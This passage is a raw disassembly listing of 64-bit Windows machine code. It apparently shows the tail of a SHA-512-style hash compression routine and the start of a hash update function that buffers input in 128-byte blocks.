   1400087e9:	48 c1 e9 20          	shr    $0x20,%rcx
   1400087ed:	44 8b f1             	mov    %ecx,%r14d
   1400087f0:	48 89 4c 24 38       	mov    %rcx,0x38(%rsp)
   1400087f5:	c1 64 24 38 12       	shll   $0x12,0x38(%rsp)
   1400087fa:	44 8b e1             	mov    %ecx,%r12d
   1400087fd:	4c 89 7c 24 60       	mov    %r15,0x60(%rsp)
   140008802:	41 f7 d4             	not    %r12d
   140008805:	44 8b f9             	mov    %ecx,%r15d
   140008808:	49 c1 e9 20          	shr    $0x20,%r9
   14000880c:	41 c1 ef 0e          	shr    $0xe,%r15d
   140008810:	41 8b c1             	mov    %r9d,%eax
   140008813:	23 c1                	and    %ecx,%eax
   140008815:	45 23 e0             	and    %r8d,%r12d
   140008818:	44 33 e0             	xor    %eax,%r12d
   14000881b:	41 8b cb             	mov    %r11d,%ecx
   14000881e:	c1 e9 09             	shr    $0x9,%ecx
   140008821:	41 8b c3             	mov    %r11d,%eax
   140008824:	c1 e0 12             	shl    $0x12,%eax
   140008827:	44 0b f8             	or     %eax,%r15d
   14000882a:	41 8b c6             	mov    %r14d,%eax
   14000882d:	c1 e0 17             	shl    $0x17,%eax
   140008830:	0b c8                	or     %eax,%ecx
   140008832:	41 8b c6             	mov    %r14d,%eax
   140008835:	44 33 f9             	xor    %ecx,%r15d
   140008838:	c1 e8 12             	shr    $0x12,%eax
   14000883b:	41 8b cb             	mov    %r11d,%ecx
   14000883e:	c1 e1 0e             	shl    $0xe,%ecx
   140008841:	0b c8                	or     %eax,%ecx
   140008843:	48 8b 44 24 48       	mov    0x48(%rsp),%rax
   140008848:	44 33 f9             	xor    %ecx,%r15d
   14000884b:	48 8d 0d 2e 91 ff ff 	lea    -0x6ed2(%rip),%rcx        # 0x140001980
   140008852:	45 03 fc             	add    %r12d,%r15d
   140008855:	8b 74 08 34          	mov    0x34(%rax,%rcx,1),%esi
   140008859:	8b 9c 05 e4 00 00 00 	mov    0xe4(%rbp,%rax,1),%ebx
   140008860:	8b 4c 24 68          	mov    0x68(%rsp),%ecx
   140008864:	8b c1                	mov    %ecx,%eax
   140008866:	c1 e8 0e             	shr    $0xe,%eax
   140008869:	09 44 24 38          	or     %eax,0x38(%rsp)
   14000886d:	42 8d 3c 3e          	lea    (%rsi,%r15,1),%edi
   140008871:	c1 e9 12             	shr    $0x12,%ecx
   140008874:	44 8d 1c 3b          	lea    (%rbx,%rdi,1),%r11d
   140008878:	41 8b c6             	mov    %r14d,%eax
   14000887b:	46 8d 2c 1a          	lea    (%rdx,%r11,1),%r13d
   14000887f:	c1 e0 0e             	shl    $0xe,%eax
   140008882:	0b c8                	or     %eax,%ecx
   140008884:	31 4c 24 38          	xor    %ecx,0x38(%rsp)
   140008888:	8b 4c 24 68          	mov    0x68(%rsp),%ecx
   14000888c:	8b c1                	mov    %ecx,%eax
   14000888e:	c1 e0 17             	shl    $0x17,%eax
   140008891:	f7 d1                	not    %ecx
   140008893:	41 c1 ee 09          	shr    $0x9,%r14d
   140008897:	23 4c 24 10          	and    0x10(%rsp),%ecx
   14000889b:	41 0b c6             	or     %r14d,%eax
   14000889e:	4c 8b 74 24 38       	mov    0x38(%rsp),%r14
   1400088a3:	44 33 f0             	xor    %eax,%r14d
   1400088a6:	8b 44 24 28          	mov    0x28(%rsp),%eax
   1400088aa:	23 44 24 68          	and    0x68(%rsp),%eax
   1400088ae:	33 c8                	xor    %eax,%ecx
   1400088b0:	48 8b 44 24 48       	mov    0x48(%rsp),%rax
   1400088b5:	44 03 f1             	add    %ecx,%r14d
   1400088b8:	48 8d 0d c1 90 ff ff 	lea    -0x6f3f(%rip),%rcx        # 0x140001980
   1400088bf:	44 3b ea             	cmp    %edx,%r13d
   1400088c2:	41 83 d6 00          	adc    $0x0,%r14d
   1400088c6:	45 3b fc             	cmp    %r12d,%r15d
   1400088c9:	44 8b 7c 24 08       	mov    0x8(%rsp),%r15d
   1400088ce:	41 83 d6 00          	adc    $0x0,%r14d
   1400088d2:	44 3b db             	cmp    %ebx,%r11d
   1400088d5:	8b 5c 24 58          	mov    0x58(%rsp),%ebx
   1400088d9:	41 83 d6 00          	adc    $0x0,%r14d
   1400088dd:	3b fe                	cmp    %esi,%edi
   1400088df:	8b 74 24 24          	mov    0x24(%rsp),%esi
   1400088e3:	44 13 b4 05 e0 00 00 	adc    0xe0(%rbp,%rax,1),%r14d
   1400088ea:	00 
   1400088eb:	44 03 74 08 30       	add    0x30(%rax,%rcx,1),%r14d
   1400088f0:	8b c6                	mov    %esi,%eax
   1400088f2:	44 03 74 24 0c       	add    0xc(%rsp),%r14d
   1400088f7:	c1 e8 1c             	shr    $0x1c,%eax
   1400088fa:	4c 89 74 24 38       	mov    %r14,0x38(%rsp)
   1400088ff:	4c 8b 74 24 60       	mov    0x60(%rsp),%r14
   140008904:	41 8b ce             	mov    %r14d,%ecx
   140008907:	41 8b fe             	mov    %r14d,%edi
   14000890a:	c1 e9 02             	shr    $0x2,%ecx
   14000890d:	45 8b de             	mov    %r14d,%r11d
   140008910:	c1 e7 04             	shl    $0x4,%edi
   140008913:	41 8b d6             	mov    %r14d,%edx
   140008916:	0b f8                	or     %eax,%edi
   140008918:	8b c6                	mov    %esi,%eax
   14000891a:	c1 e0 1e             	shl    $0x1e,%eax
   14000891d:	0b c8                	or     %eax,%ecx
   14000891f:	8b c6                	mov    %esi,%eax
   140008921:	33 f9                	xor    %ecx,%edi
   140008923:	c1 e0 19             	shl    $0x19,%eax
   140008926:	41 8b ce             	mov    %r14d,%ecx
   140008929:	c1 e9 07             	shr    $0x7,%ecx
   14000892c:	0b c8                	or     %eax,%ecx
   14000892e:	8b 44 24 20          	mov    0x20(%rsp),%eax
   140008932:	33 f9                	xor    %ecx,%edi
   140008934:	33 d8                	xor    %eax,%ebx
   140008936:	23 44 24 58          	and    0x58(%rsp),%eax
   14000893a:	23 de                	and    %esi,%ebx
   14000893c:	8b 4c 24 30          	mov    0x30(%rsp),%ecx
   140008940:	33 d8                	xor    %eax,%ebx
   140008942:	03 df                	add    %edi,%ebx
   140008944:	42 8d 04 29          	lea    (%rcx,%r13,1),%eax
   140008948:	3b c1                	cmp    %ecx,%eax
   14000894a:	89 44 24 1c          	mov    %eax,0x1c(%rsp)
   14000894e:	48 8b 4c 24 38       	mov    0x38(%rsp),%rcx
   140008953:	46 8d 24 2b          	lea    (%rbx,%r13,1),%r12d
   140008957:	41 83 d7 00          	adc    $0x0,%r15d
   14000895b:	44 89 64 24 0c       	mov    %r12d,0xc(%rsp)
   140008960:	44 03 f9             	add    %ecx,%r15d
   140008963:	41 c1 e3 19          	shl    $0x19,%r11d
   140008967:	c1 e2 1e             	shl    $0x1e,%edx
   14000896a:	44 89 7c 24 18       	mov    %r15d,0x18(%rsp)
   14000896f:	48 8b 44 24 18       	mov    0x18(%rsp),%rax
   140008974:	48 8b c8             	mov    %rax,%rcx
   140008977:	44 89 7c 24 50       	mov    %r15d,0x50(%rsp)
   14000897c:	48 c1 e9 20          	shr    $0x20,%rcx
   140008980:	48 89 4c 24 78       	mov    %rcx,0x78(%rsp)
   140008985:	89 4d 24             	mov    %ecx,0x24(%rbp)
   140008988:	8b ce                	mov    %esi,%ecx
   14000898a:	c1 e9 07             	shr    $0x7,%ecx
   14000898d:	44 0b d9             	or     %ecx,%r11d
   140008990:	44 89 7d 20          	mov    %r15d,0x20(%rbp)
   140008994:	8b ce                	mov    %esi,%ecx
   140008996:	c1 e9 02             	shr    $0x2,%ecx
   140008999:	0b d1                	or     %ecx,%edx
   14000899b:	8b ce                	mov    %esi,%ecx
   14000899d:	44 33 da             	xor    %edx,%r11d
   1400089a0:	41 8b d6             	mov    %r14d,%edx
   1400089a3:	c1 ea 1c             	shr    $0x1c,%edx
   1400089a6:	c1 e1 04             	shl    $0x4,%ecx
   1400089a9:	0b d1                	or     %ecx,%edx
   1400089ab:	8b 4c 24 2c          	mov    0x2c(%rsp),%ecx
   1400089af:	44 33 da             	xor    %edx,%r11d
   1400089b2:	8b d1                	mov    %ecx,%edx
   1400089b4:	23 4c 24 04          	and    0x4(%rsp),%ecx
   1400089b8:	33 54 24 04          	xor    0x4(%rsp),%edx
   1400089bc:	41 23 d6             	and    %r14d,%edx
   1400089bf:	4c 8b f0             	mov    %rax,%r14
   1400089c2:	33 d1                	xor    %ecx,%edx
   1400089c4:	48 8b 4c 24 38       	mov    0x38(%rsp),%rcx
   1400089c9:	44 03 da             	add    %edx,%r11d
   1400089cc:	8b 54 24 50          	mov    0x50(%rsp),%edx
   1400089d0:	3b df                	cmp    %edi,%ebx
   1400089d2:	83 d1 00             	adc    $0x0,%ecx
   1400089d5:	45 3b e5             	cmp    %r13d,%r12d
   1400089d8:	41 13 cb             	adc    %r11d,%ecx
   1400089db:	49 c1 ee 20          	shr    $0x20,%r14
   1400089df:	48 89 4c 24 38       	mov    %rcx,0x38(%rsp)
   1400089e4:	45 8b e6             	mov    %r14d,%r12d
   1400089e7:	c1 e2 0e             	shl    $0xe,%edx
   1400089ea:	41 f7 d4             	not    %r12d
   1400089ed:	41 c1 ef 09          	shr    $0x9,%r15d
   1400089f1:	45 23 e1             	and    %r9d,%r12d
   1400089f4:	49 c1 ea 20          	shr    $0x20,%r10
   1400089f8:	41 8b ca             	mov    %r10d,%ecx
   1400089fb:	41 23 ce             	and    %r14d,%ecx
   1400089fe:	44 33 e1             	xor    %ecx,%r12d
   140008a01:	41 8b ce             	mov    %r14d,%ecx
   140008a04:	c1 e1 17             	shl    $0x17,%ecx
   140008a07:	44 0b f9             	or     %ecx,%r15d
   140008a0a:	41 8b ce             	mov    %r14d,%ecx
   140008a0d:	c1 e9 12             	shr    $0x12,%ecx
   140008a10:	0b d1                	or     %ecx,%edx
   140008a12:	41 8b ce             	mov    %r14d,%ecx
   140008a15:	44 33 fa             	xor    %edx,%r15d
   140008a18:	c1 e9 0e             	shr    $0xe,%ecx
   140008a1b:	8b 54 24 50          	mov    0x50(%rsp),%edx
   140008a1f:	c1 e2 12             	shl    $0x12,%edx
   140008a22:	0b d1                	or     %ecx,%edx
   140008a24:	48 8b 4c 24 48       	mov    0x48(%rsp),%rcx
   140008a29:	44 33 fa             	xor    %edx,%r15d
   140008a2c:	48 8d 15 4d 8f ff ff 	lea    -0x70b3(%rip),%rdx        # 0x140001980
   140008a33:	45 03 fc             	add    %r12d,%r15d
   140008a36:	8b 74 11 3c          	mov    0x3c(%rcx,%rdx,1),%esi
   140008a3a:	8b 9c 0d ec 00 00 00 	mov    0xec(%rbp,%rcx,1),%ebx
   140008a41:	8b 54 24 50          	mov    0x50(%rsp),%edx
   140008a45:	8b ca                	mov    %edx,%ecx
   140008a47:	c1 e9 12             	shr    $0x12,%ecx
   140008a4a:	89 0c 24             	mov    %ecx,(%rsp)
   140008a4d:	42 8d 3c 3e          	lea    (%rsi,%r15,1),%edi
   140008a51:	c1 e2 17             	shl    $0x17,%edx
   140008a54:	44 8d 1c 3b          	lea    (%rbx,%rdi,1),%r11d
   140008a58:	41 8b ce             	mov    %r14d,%ecx
   140008a5b:	47 8d 2c 18          	lea    (%r8,%r11,1),%r13d
   140008a5f:	c1 e1 0e             	shl    $0xe,%ecx
   140008a62:	09 0c 24             	or     %ecx,(%rsp)
   140008a65:	41 8b ce             	mov    %r14d,%ecx
   140008a68:	41 c1 e6 12          	shl    $0x12,%r14d
   140008a6c:	c1 e9 09             	shr    $0x9,%ecx
   140008a6f:	0b d1                	or     %ecx,%edx
   140008a71:	8b 4c 24 50          	mov    0x50(%rsp),%ecx
   140008a75:	31 14 24             	xor    %edx,(%rsp)
   140008a78:	c1 e9 0e             	shr    $0xe,%ecx
   140008a7b:	41 0b ce             	or     %r14d,%ecx
   140008a7e:	44 8b 34 24          	mov    (%rsp),%r14d
   140008a82:	44 33 f1             	xor    %ecx,%r14d
   140008a85:	8b 4c 24 50          	mov    0x50(%rsp),%ecx
   140008a89:	8b d1                	mov    %ecx,%edx
   140008a8b:	23 4c 24 68          	and    0x68(%rsp),%ecx
   140008a8f:	f7 d2                	not    %edx
   140008a91:	23 54 24 28          	and    0x28(%rsp),%edx
   140008a95:	33 d1                	xor    %ecx,%edx
   140008a97:	44 03 f2             	add    %edx,%r14d
   140008a9a:	44 3b db             	cmp    %ebx,%r11d
   140008a9d:	41 83 d6 00          	adc    $0x0,%r14d
   140008aa1:	3b fe                	cmp    %esi,%edi
   140008aa3:	41 83 d6 00          	adc    $0x0,%r14d
   140008aa7:	45 3b e8             	cmp    %r8d,%r13d
   140008aaa:	41 83 d6 00          	adc    $0x0,%r14d
   140008aae:	45 3b fc             	cmp    %r12d,%r15d
   140008ab1:	41 83 d6 00          	adc    $0x0,%r14d
   140008ab5:	8b 74 24 0c          	mov    0xc(%rsp),%esi
   140008ab9:	4c 8b 44 24 38       	mov    0x38(%rsp),%r8
   140008abe:	48 8d 15 bb 8e ff ff 	lea    -0x7145(%rip),%rdx        # 0x140001980
   140008ac5:	48 8b 4c 24 48       	mov    0x48(%rsp),%rcx
   140008aca:	41 8b f8             	mov    %r8d,%edi
   140008acd:	44 8b 5c 24 20       	mov    0x20(%rsp),%r11d
   140008ad2:	c1 e7 04             	shl    $0x4,%edi
   140008ad5:	44 03 74 11 38       	add    0x38(%rcx,%rdx,1),%r14d
   140008ada:	41 8b d0             	mov    %r8d,%edx
   140008add:	44 03 b4 0d e8 00 00 	add    0xe8(%rbp,%rcx,1),%r14d
   140008ae4:	00 
   140008ae5:	8b ce                	mov    %esi,%ecx
   140008ae7:	44 03 74 24 10       	add    0x10(%rsp),%r14d
   140008aec:	c1 ea 02             	shr    $0x2,%edx
   140008aef:	45 8b fe             	mov    %r14d,%r15d
   140008af2:	c1 e9 1c             	shr    $0x1c,%ecx
   140008af5:	0b f9                	or     %ecx,%edi
   140008af7:	44 89 34 24          	mov    %r14d,(%rsp)
   140008afb:	4d 8b f0             	mov    %r8,%r14
   140008afe:	8b ce                	mov    %esi,%ecx
   140008b00:	c1 e1 1e             	shl    $0x1e,%ecx
   140008b03:	0b d1                	or     %ecx,%edx
   140008b05:	8b ce                	mov    %esi,%ecx
   140008b07:	33 fa                	xor    %edx,%edi
   140008b09:	c1 e1 19             	shl    $0x19,%ecx
   140008b0c:	41 8b d0             	mov    %r8d,%edx
   140008b0f:	45 8b c6             	mov    %r14d,%r8d
   140008b12:	c1 ea 07             	shr    $0x7,%edx
   140008b15:	0b d1                	or     %ecx,%edx
   140008b17:	8b 4c 24 24          	mov    0x24(%rsp),%ecx
   140008b1b:	33 fa                	xor    %edx,%edi
   140008b1d:	8b d9                	mov    %ecx,%ebx
   140008b1f:	33 5c 24 58          	xor    0x58(%rsp),%ebx
   140008b23:	23 4c 24 58          	and    0x58(%rsp),%ecx
   140008b27:	23 de                	and    %esi,%ebx
   140008b29:	33 d9                	xor    %ecx,%ebx
   140008b2b:	43 8d 0c 2b          	lea    (%r11,%r13,1),%ecx
   140008b2f:	03 df                	add    %edi,%ebx
   140008b31:	89 4c 24 1c          	mov    %ecx,0x1c(%rsp)
   140008b35:	41 3b cb             	cmp    %r11d,%ecx
   140008b38:	45 8b de             	mov    %r14d,%r11d
   140008b3b:	41 83 d7 00          	adc    $0x0,%r15d
   140008b3f:	41 c1 e0 1e          	shl    $0x1e,%r8d
   140008b43:	44 03 7c 24 04       	add    0x4(%rsp),%r15d
   140008b48:	41 c1 e3 19          	shl    $0x19,%r11d
   140008b4c:	44 89 7c 24 18       	mov    %r15d,0x18(%rsp)
   140008b51:	48 8b 4c 24 18       	mov    0x18(%rsp),%rcx
   140008b56:	48 8b d1             	mov    %rcx,%rdx
   140008b59:	48 c1 ea 20          	shr    $0x20,%rdx
   140008b5d:	48 89 55 38          	mov    %rdx,0x38(%rbp)
   140008b61:	42 8d 14 2b          	lea    (%rbx,%r13,1),%edx
   140008b65:	89 54 24 20          	mov    %edx,0x20(%rsp)
   140008b69:	8b d6                	mov    %esi,%edx
   140008b6b:	c1 ea 07             	shr    $0x7,%edx
   140008b6e:	44 0b da             	or     %edx,%r11d
   140008b71:	8b d6                	mov    %esi,%edx
   140008b73:	c1 ea 02             	shr    $0x2,%edx
   140008b76:	44 0b c2             	or     %edx,%r8d
   140008b79:	8b d6                	mov    %esi,%edx
   140008b7b:	48 8b 74 24 60       	mov    0x60(%rsp),%rsi
   140008b80:	45 33 d8             	xor    %r8d,%r11d
   140008b83:	c1 e2 04             	shl    $0x4,%edx
   140008b86:	45 8b c6             	mov    %r14d,%r8d
   140008b89:	44 8b 74 24 2c       	mov    0x2c(%rsp),%r14d
   140008b8e:	41 c1 e8 1c          	shr    $0x1c,%r8d
   140008b92:	44 0b c2             	or     %edx,%r8d
   140008b95:	8b d6                	mov    %esi,%edx
   140008b97:	45 33 d8             	xor    %r8d,%r11d
   140008b9a:	41 23 d6             	and    %r14d,%edx
   140008b9d:	44 8b c6             	mov    %esi,%r8d
   140008ba0:	45 33 c6             	xor    %r14d,%r8d
   140008ba3:	44 23 44 24 38       	and    0x38(%rsp),%r8d
   140008ba8:	44 33 c2             	xor    %edx,%r8d
   140008bab:	8b 14 24             	mov    (%rsp),%edx
   140008bae:	45 03 d8             	add    %r8d,%r11d
   140008bb1:	46 8d 04 2b          	lea    (%rbx,%r13,1),%r8d
   140008bb5:	45 3b c5             	cmp    %r13d,%r8d
   140008bb8:	83 d2 00             	adc    $0x0,%edx
   140008bbb:	3b df                	cmp    %edi,%ebx
   140008bbd:	41 13 d3             	adc    %r11d,%edx
   140008bc0:	89 14 24             	mov    %edx,(%rsp)
   140008bc3:	48 8b 5d 38          	mov    0x38(%rbp),%rbx
   140008bc7:	4c 8b 5c 24 38       	mov    0x38(%rsp),%r11
   140008bcc:	48 83 44 24 48 40    	addq   $0x40,0x48(%rsp)
   140008bd2:	48 83 6d 48 01       	subq   $0x1,0x48(%rbp)
   140008bd7:	48 8b 7c 24 78       	mov    0x78(%rsp),%rdi
   140008bdc:	44 8b 65 80          	mov    -0x80(%rbp),%r12d
   140008be0:	44 8b 6c 24 50       	mov    0x50(%rsp),%r13d
   140008be5:	44 89 5d c4          	mov    %r11d,-0x3c(%rbp)
   140008be9:	44 89 5d e0          	mov    %r11d,-0x20(%rbp)
   140008bed:	44 89 5d f8          	mov    %r11d,-0x8(%rbp)
   140008bf1:	44 89 5d 0c          	mov    %r11d,0xc(%rbp)
   140008bf5:	44 8b da             	mov    %edx,%r11d
   140008bf8:	89 54 24 74          	mov    %edx,0x74(%rsp)
   140008bfc:	89 55 ac             	mov    %edx,-0x54(%rbp)
   140008bff:	89 54 24 70          	mov    %edx,0x70(%rsp)
   140008c03:	89 55 b0             	mov    %edx,-0x50(%rbp)
   140008c06:	89 54 24 40          	mov    %edx,0x40(%rsp)
   140008c0a:	89 55 b4             	mov    %edx,-0x4c(%rbp)
   140008c0d:	89 55 b8             	mov    %edx,-0x48(%rbp)
   140008c10:	89 55 bc             	mov    %edx,-0x44(%rbp)
   140008c13:	44 89 65 d8          	mov    %r12d,-0x28(%rbp)
   140008c17:	44 8b 64 24 58       	mov    0x58(%rsp),%r12d
   140008c1c:	89 55 dc             	mov    %edx,-0x24(%rbp)
   140008c1f:	89 55 f4             	mov    %edx,-0xc(%rbp)
   140008c22:	89 55 08             	mov    %edx,0x8(%rbp)
   140008c25:	89 55 10             	mov    %edx,0x10(%rbp)
   140008c28:	48 8b 54 24 48       	mov    0x48(%rsp),%rdx
   140008c2d:	44 89 7d 28          	mov    %r15d,0x28(%rbp)
   140008c31:	89 5c 24 10          	mov    %ebx,0x10(%rsp)
   140008c35:	44 89 7d 88          	mov    %r15d,-0x78(%rbp)
   140008c39:	89 5d 8c             	mov    %ebx,-0x74(%rbp)
   140008c3c:	44 89 7d 90          	mov    %r15d,-0x70(%rbp)
   140008c40:	89 5d 94             	mov    %ebx,-0x6c(%rbp)
   140008c43:	44 89 7d 98          	mov    %r15d,-0x68(%rbp)
   140008c47:	89 5d 9c             	mov    %ebx,-0x64(%rbp)
   140008c4a:	44 89 7d a0          	mov    %r15d,-0x60(%rbp)
   140008c4e:	89 5c 24 08          	mov    %ebx,0x8(%rsp)
   140008c52:	89 5c 24 30          	mov    %ebx,0x30(%rsp)
   140008c56:	44 89 7c 24 04       	mov    %r15d,0x4(%rsp)
   140008c5b:	89 5d a4             	mov    %ebx,-0x5c(%rbp)
   140008c5e:	44 89 7d a8          	mov    %r15d,-0x58(%rbp)
   140008c62:	89 75 c0             	mov    %esi,-0x40(%rbp)
   140008c65:	89 7d c8             	mov    %edi,-0x38(%rbp)
   140008c68:	44 89 6d cc          	mov    %r13d,-0x34(%rbp)
   140008c6c:	89 5d d0             	mov    %ebx,-0x30(%rbp)
   140008c6f:	44 89 7d d4          	mov    %r15d,-0x2c(%rbp)
   140008c73:	89 75 e4             	mov    %esi,-0x1c(%rbp)
   140008c76:	89 5d e8             	mov    %ebx,-0x18(%rbp)
   140008c79:	44 89 7d ec          	mov    %r15d,-0x14(%rbp)
   140008c7d:	89 7d f0             	mov    %edi,-0x10(%rbp)
   140008c80:	89 5d fc             	mov    %ebx,-0x4(%rbp)
   140008c83:	89 5d 00             	mov    %ebx,0x0(%rbp)
   140008c86:	44 89 7d 04          	mov    %r15d,0x4(%rbp)
   140008c8a:	0f 85 d0 ef ff ff    	jne    0x140007c60
   140008c90:	4c 8b 5d 50          	mov    0x50(%rbp),%r11
   140008c94:	48 8b 5d 58          	mov    0x58(%rbp),%rbx
   140008c98:	48 8b d3             	mov    %rbx,%rdx
   140008c9b:	48 c1 ea 20          	shr    $0x20,%rdx
   140008c9f:	44 03 c2             	add    %edx,%r8d
   140008ca2:	44 3b 44 24 20       	cmp    0x20(%rsp),%r8d
   140008ca7:	45 89 43 04          	mov    %r8d,0x4(%r11)
   140008cab:	13 1c 24             	adc    (%rsp),%ebx
   140008cae:	4c 8b 45 60          	mov    0x60(%rbp),%r8
   140008cb2:	49 8b d0             	mov    %r8,%rdx
   140008cb5:	41 89 1b             	mov    %ebx,(%r11)
   140008cb8:	48 c1 ea 20          	shr    $0x20,%rdx
   140008cbc:	03 54 24 0c          	add    0xc(%rsp),%edx
   140008cc0:	3b 54 24 0c          	cmp    0xc(%rsp),%edx
   140008cc4:	41 89 53 0c          	mov    %edx,0xc(%r11)
   140008cc8:	44 13 44 24 38       	adc    0x38(%rsp),%r8d
   140008ccd:	45 89 43 08          	mov    %r8d,0x8(%r11)
   140008cd1:	4c 8b 45 68          	mov    0x68(%rbp),%r8
   140008cd5:	49 8b d0             	mov    %r8,%rdx
   140008cd8:	48 c1 ea 20          	shr    $0x20,%rdx
   140008cdc:	03 54 24 24          	add    0x24(%rsp),%edx
   140008ce0:	3b 54 24 24          	cmp    0x24(%rsp),%edx
   140008ce4:	41 89 53 14          	mov    %edx,0x14(%r11)
   140008ce8:	41 13 f0             	adc    %r8d,%esi
   140008ceb:	4c 8b 45 70          	mov    0x70(%rbp),%r8
   140008cef:	49 8b d0             	mov    %r8,%rdx
   140008cf2:	41 89 73 10          	mov    %esi,0x10(%r11)
   140008cf6:	48 c1 ea 20          	shr    $0x20,%rdx
   140008cfa:	41 03 d4             	add    %r12d,%edx
   140008cfd:	41 3b d4             	cmp    %r12d,%edx
   140008d00:	41 89 53 1c          	mov    %edx,0x1c(%r11)
   140008d04:	48 8b 55 78          	mov    0x78(%rbp),%rdx
   140008d08:	45 13 f0             	adc    %r8d,%r14d
   140008d0b:	48 c1 e9 20          	shr    $0x20,%rcx
   140008d0f:	03 d1                	add    %ecx,%edx
   140008d11:	45 89 73 18          	mov    %r14d,0x18(%r11)
   140008d15:	3b d1                	cmp    %ecx,%edx
   140008d17:	41 89 53 24          	mov    %edx,0x24(%r11)
   140008d1b:	48 8b 8d 88 00 00 00 	mov    0x88(%rbp),%rcx
   140008d22:	44 13 bd 80 00 00 00 	adc    0x80(%rbp),%r15d
   140008d29:	48 c1 e8 20          	shr    $0x20,%rax
   140008d2d:	03 c8                	add    %eax,%ecx
   140008d2f:	45 89 7b 20          	mov    %r15d,0x20(%r11)
   140008d33:	3b c8                	cmp    %eax,%ecx
   140008d35:	41 89 4b 2c          	mov    %ecx,0x2c(%r11)
   140008d39:	48 8b 85 98 00 00 00 	mov    0x98(%rbp),%rax
   140008d40:	44 13 ad 90 00 00 00 	adc    0x90(%rbp),%r13d
   140008d47:	41 03 c2             	add    %r10d,%eax
   140008d4a:	41 3b c2             	cmp    %r10d,%eax
   140008d4d:	41 89 43 34          	mov    %eax,0x34(%r11)
   140008d51:	8b 44 24 68          	mov    0x68(%rsp),%eax
   140008d55:	13 85 a0 00 00 00    	adc    0xa0(%rbp),%eax
   140008d5b:	41 89 43 30          	mov    %eax,0x30(%r11)
   140008d5f:	48 8b 85 a8 00 00 00 	mov    0xa8(%rbp),%rax
   140008d66:	41 03 c1             	add    %r9d,%eax
   140008d69:	45 89 6b 28          	mov    %r13d,0x28(%r11)
   140008d6d:	41 89 43 3c          	mov    %eax,0x3c(%r11)
   140008d71:	41 3b c1             	cmp    %r9d,%eax
   140008d74:	8b 44 24 28          	mov    0x28(%rsp),%eax
   140008d78:	13 45 30             	adc    0x30(%rbp),%eax
   140008d7b:	41 89 43 38          	mov    %eax,0x38(%r11)
   140008d7f:	48 8b 8d 30 03 00 00 	mov    0x330(%rbp),%rcx
   140008d86:	48 33 cc             	xor    %rsp,%rcx
   140008d89:	e8 52 0c 00 00       	call   0x1400099e0
   140008d8e:	4c 8d 9c 24 40 04 00 	lea    0x440(%rsp),%r11
   140008d95:	00 
   140008d96:	49 8b 5b 38          	mov    0x38(%r11),%rbx
   140008d9a:	49 8b 73 40          	mov    0x40(%r11),%rsi
   140008d9e:	49 8b 7b 48          	mov    0x48(%r11),%rdi
   140008da2:	49 8b e3             	mov    %r11,%rsp
   140008da5:	41 5f                	pop    %r15
   140008da7:	41 5e                	pop    %r14
   140008da9:	41 5d                	pop    %r13
   140008dab:	41 5c                	pop    %r12
   140008dad:	5d                   	pop    %rbp
   140008dae:	c3                   	ret
   140008daf:	cc                   	int3
   140008db0:	40 53                	rex push %rbx
   140008db2:	56                   	push   %rsi
   140008db3:	57                   	push   %rdi
   140008db4:	48 81 ec 30 01 00 00 	sub    $0x130,%rsp
   140008dbb:	48 8b 05 3e 22 00 00 	mov    0x223e(%rip),%rax        # 0x14000b000
   140008dc2:	48 33 c4             	xor    %rsp,%rax
   140008dc5:	48 89 84 24 10 01 00 	mov    %rax,0x110(%rsp)
   140008dcc:	00 
   140008dcd:	45 33 d2             	xor    %r10d,%r10d
   140008dd0:	49 63 f0             	movslq %r8d,%rsi
   140008dd3:	01 b1 c4 00 00 00    	add    %esi,0xc4(%rcx)
   140008dd9:	48 8b d9             	mov    %rcx,%rbx
   140008ddc:	39 b1 c4 00 00 00    	cmp    %esi,0xc4(%rcx)
   140008de2:	41 8b c2             	mov    %r10d,%eax
   140008de5:	48 8b fa             	mov    %rdx,%rdi
   140008de8:	0f 92 c0             	setb   %al
   140008deb:	01 81 c8 00 00 00    	add    %eax,0xc8(%rcx)
   140008df1:	41 8b ca             	mov    %r10d,%ecx
   140008df4:	39 83 c8 00 00 00    	cmp    %eax,0xc8(%rbx)
   140008dfa:	0f 92 c1             	setb   %cl
   140008dfd:	01 8b cc 00 00 00    	add    %ecx,0xcc(%rbx)
   140008e03:	39 8b cc 00 00 00    	cmp    %ecx,0xcc(%rbx)
   140008e09:	44 11 93 d0 00 00 00 	adc    %r10d,0xd0(%rbx)
   140008e10:	48 63 8b c0 00 00 00 	movslq 0xc0(%rbx),%rcx
   140008e17:	8d 04 31             	lea    (%rcx,%rsi,1),%eax
   140008e1a:	85 c9                	test   %ecx,%ecx
   140008e1c:	74 54                	je     0x140008e72
   140008e1e:	3d 80 00 00 00       	cmp    $0x80,%eax
   140008e23:	7d 58                	jge    0x140008e7d
   140008e25:	44 89 54 24 20       	mov    %r10d,0x20(%rsp)
   140008e2a:	4c 8d 0c 0b          	lea    (%rbx,%rcx,1),%r9
   140008e2e:	48 63 44 24 20       	movslq 0x20(%rsp),%rax
   140008e33:	48 3b c6             	cmp    %rsi,%rax
   140008e36:	73 2f                	jae    0x140008e67
   140008e38:	0f 1f 84 00 00 00 00 	nopl   0x0(%rax,%rax,1)
   140008e3f:	00 
   140008e40:	48 63 44 24 20       	movslq 0x20(%rsp),%rax
   140008e45:	48 63 4c 24 20       	movslq 0x20(%rsp),%rcx
   140008e4a:	0f b6 04 10          	movzbl (%rax,%rdx,1),%eax
   140008e4e:	42 88 44 09 40       	mov    %al,0x40(%rcx,%r9,1)
   140008e53:	8b 44 24 20          	mov    0x20(%rsp),%eax
   140008e57:	ff c0                	inc    %eax
   140008e59:	89 44 24 20          	mov    %eax,0x20(%rsp)
   140008e5d:	48 63 44 24 20       	movslq 0x20(%rsp),%rax
   140008e62:	48 3b c6             	cmp    %rsi,%rax
   140008e65:	72 d9                	jb     0x140008e40
   140008e67:	01 b3 c0 00 00 00    	add    %esi,0xc0(%rbx)
   140008e6d:	e9 4a 05 00 00       	jmp    0x1400093bc
   140008e72:	3d 80 00 00 00       	cmp    $0x80,%eax
   140008e77:	0f 8c f8 04 00 00    	jl     0x140009375
   140008e7d:	48 89 ac 24 58 01 00 	mov    %rbp,0x158(%rsp)
   140008e84:	00 
   140008e85:	48 8d 84 24 ac 00 00 	lea    0xac(%rsp),%rax
   140008e8c:	00 
   140008e8d:	48 2b c3             	sub    %rbx,%rax
   140008e90:	4c 89 a4 24 60 01 00 	mov    %r12,0x160(%rsp)
   140008e97:	00 
   140008e98:	48 89 44 24 28       	mov    %rax,0x28(%rsp)
   140008e9d:	4c 8d a4 24 a0 00 00 	lea    0xa0(%rsp),%r12
   140008ea4:	00 
